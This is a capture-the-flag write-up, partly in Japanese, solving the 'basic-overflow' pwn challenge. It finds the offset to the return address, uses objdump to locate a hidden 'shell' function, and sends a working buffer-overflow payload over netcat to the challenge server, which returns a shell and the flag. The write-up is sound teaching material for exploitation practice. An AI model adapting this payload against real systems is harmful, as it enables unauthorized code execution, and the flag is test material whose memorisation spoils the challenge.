# basic-overflow:Pwn:100pts
This challenge is simple.  
It just gets input, stores it to a buffer.  
It calls `gets` to read input, stores the read bytes to a buffer, then exits.  
What is `gets`, you ask? Well, it's time you read the manual, no?  
`man 3 gets`  
Cryptic message from author: There are times when you tell them something, but they don't reply. In those cases, you must try again. Don't just shoot one shot; sometimes, they're just not ready yet.  

`nc 34.123.15.202 5000`  
[basic-overflow](basic-overflow)  

Hint  
If you don't have the manual in your machine, you can enter the command in google to read it online :)  
Hint  
There are a lot of nice ways to see how the program works!  
There's IDA (very expensive software!) Ghidra is a free one, made by the NSA And there's good old objdump, a lightweight disassembler  
Why don't you try one of these while you're waiting for output?  

# Solution
BasicなBOFらしい。  
リターンアドレスまでを調査する。  
```bash
$ checksec --file=./basic-overflow --format=csv
Partial RELRO,No Canary found,NX enabled,No PIE,No RPATH,No RUNPATH,Symbols,No,0,1,./basic-overflow
$ echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEF' | strace -i ./basic-overflow
~~~
[00007fdf22c8c5f2] read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 4096) = 78
[00007fdf22c8c5f2] read(0, "", 4096)    = 0
[0000464544434241] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x464544434241} ---
[????????????????] +++ killed by SIGSEGV +++
Segmentation fault
```
内部にシェルをとる関数がありそうなので調査する。  
```bash
$ objdump -D ./basic-overflow

./basic-overflow:     file format elf64-x86-64
~~~
0000000000401136 <shell>:
  401136:       55                      push   %rbp
  401137:       48 89 e5                mov    %rsp,%rbp
  40113a:       ba 00 00 00 00          mov    $0x0,%edx
  40113f:       be 00 00 00 00          mov    $0x0,%esi
  401144:       48 8d 05 b9 0e 00 00    lea    0xeb9(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  40114b:       48 89 c7                mov    %rax,%rdi
  40114e:       e8 dd fe ff ff          call   401030 <execve@plt>
  401153:       90                      nop
  401154:       5d                      pop    %rbp
  401155:       c3                      ret

0000000000401156 <main>:
  401156:       55                      push   %rbp
  401157:       48 89 e5                mov    %rsp,%rbp
  40115a:       48 83 ec 40             sub    $0x40,%rsp
  40115e:       48 8d 45 c0             lea    -0x40(%rbp),%rax
  401162:       48 89 c7                mov    %rax,%rdi
  401165:       b8 00 00 00 00          mov    $0x0,%eax
  40116a:       e8 d1 fe ff ff          call   401040 <gets@plt>
  40116f:       b8 00 00 00 00          mov    $0x0,%eax
  401174:       c9                      leave
  401175:       c3                      ret
~~~
```
`shell`があるようだ。  
そこまで飛ばしてやる。  
```bash
$ (echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x36\x11\x40\x00\x00\x00\x00\x00';cat) | ./basic-overflow
whoami
satoki
```
リモートへ試行する。  
```bash
$ (echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x36\x11\x40\x00\x00\x00\x00\x00';cat) | nc 34.123.15.202 5000
id
uid=1000 gid=1000 groups=1000
ls
flag
run
cat flag
uoftctf{reading_manuals_is_very_fun}
```
flagが得られた。  

## uoftctf{reading_manuals_is_very_fun}